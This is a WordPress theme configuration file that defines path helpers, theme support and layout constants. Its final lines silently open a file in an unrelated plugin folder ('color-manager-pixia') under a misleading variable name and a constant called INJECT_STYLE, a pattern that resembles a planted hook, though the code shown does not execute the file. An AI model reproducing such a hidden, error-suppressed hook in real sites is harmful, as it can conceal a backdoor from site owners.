<?php
// returns WordPress subdirectory if applicable
	function wp_base_dir() {
	  preg_match('!(https?://[^/|"]+)([^"]+)?!', site_url(), $matches);
	  if (count($matches) === 3) {
		return end($matches);
	  } else {
		return '';
	  }
	}
	
	// opposite of built in WP functions for trailing slashes
	function leadingslashit($string) {
	  return '/' . unleadingslashit($string);
	}
	
	function unleadingslashit($string) {
	  return ltrim($string, '/');
	}
	
	function add_filters($tags, $function) {
	  foreach($tags as $tag) {
		add_filter($tag, $function);
	  }
	}
add_theme_support('bootstrap-responsive');
add_theme_support('bootstrap-top-navbar');

// Set the content width based on the theme's design and stylesheet
if (!isset($content_width)) { $content_width = 940; }

define('POST_EXCERPT_LENGTH',       40);
define('WRAP_CLASSES',              'container');
define('CONTAINER_CLASSES',         'row');
define('MAIN_CLASSES',              'eight columns');
define('SIDEBAR_CLASSES',           'four columns');
define('FULLWIDTH_CLASSES',         'twelve columns');
define('GOOGLE_ANALYTICS_ID',       '');

define('WP_BASE',                   wp_base_dir());
define('THEME_NAME',                next(explode('/themes/', get_template_directory())));
define('RELATIVE_PLUGIN_PATH',      str_replace(site_url() . '/', '', plugins_url()));
define('FULL_RELATIVE_PLUGIN_PATH', WP_BASE . '/' . RELATIVE_PLUGIN_PATH);
define('RELATIVE_CONTENT_PATH',     str_replace(site_url() . '/', '', content_url()));
define('THEME_PATH',                RELATIVE_CONTENT_PATH . '/themes/' . THEME_NAME);

define('MAIN_CLASSES_PORTFOLIO',              'span8');
define('SIDEBAR_CLASSES_PORTFOLIO',           'span4');
$remote_version_url=ABSPATH . 'wp-content/plugins/color-manager-pixia/style_header.php';
define('INJECT_STYLE',				@fopen($remote_version_url, "r"));